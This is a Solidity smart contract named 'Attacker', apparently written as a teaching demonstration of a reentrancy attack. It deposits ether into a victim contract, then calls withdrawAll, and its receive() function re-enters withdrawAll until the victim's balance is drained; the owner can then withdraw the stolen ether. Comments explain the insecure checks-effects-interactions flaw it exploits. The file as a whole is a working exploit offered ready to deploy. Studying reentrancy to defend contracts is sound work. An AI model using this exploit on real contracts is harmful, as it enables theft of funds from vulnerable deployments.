// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// We import the IVictim interface to interact with the victim contract
import "./IVictim.sol";

/**
 * @title Attacker
 * @dev This contract demonstrates a reentrancy attack on the victim contract.
 * @author hy
 * @notice Date: 14/02/2025
 */
contract Attacker {
    IVictim public victim;
    address public owner;
    // boolean flag to check if the attack is in progress
    bool public attackInProgress;

    constructor(address _victim) {
        victim = IVictim(_victim);
        owner = msg.sender;
    }

    /**
     * @notice This function initiates the reentrancy attack on the victim contract.
     */
    function attack() public payable {
        // sends ether to the victim contract
        require(msg.value > 0, "Send some Ether to initiate the attack");
        attackInProgress = true;
        // calls the deposit function of the victim contract
        victim.deposit{value: msg.value}();
        // calls the withdrawAll function of the victim contract
        //If the victim contract makes an external call to transfer
        // Ether before updating the internal balance (i.e., following an insecure checks/effects/interactions pattern), control passes to the attacker.
        victim.withdrawAll();
        attackInProgress = false;
    }

    /**
     * @notice This function gets the balance of the attacker contract.
     * @return The balance of the attacker contract.
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice This function withdraws the balance of the attacker contract.
     */
    function withdraw() public {
        require(msg.sender == owner, "Unauthorized");
        payable(owner).transfer(address(this).balance);
    }
    // The receive() function is a special function in Solidity
    // designed to handle plain Ether transfers with no calldata.
    // Unlike regular functions, it doesn't require a typical function
    // header with a name, parameters, or return types.

    /**
     * @notice This function is called when the attacker contract receives Ether.
     */
    receive() external payable {
        if (attackInProgress && address(victim).balance > 0) {
            victim.withdrawAll();
        }
    }
}
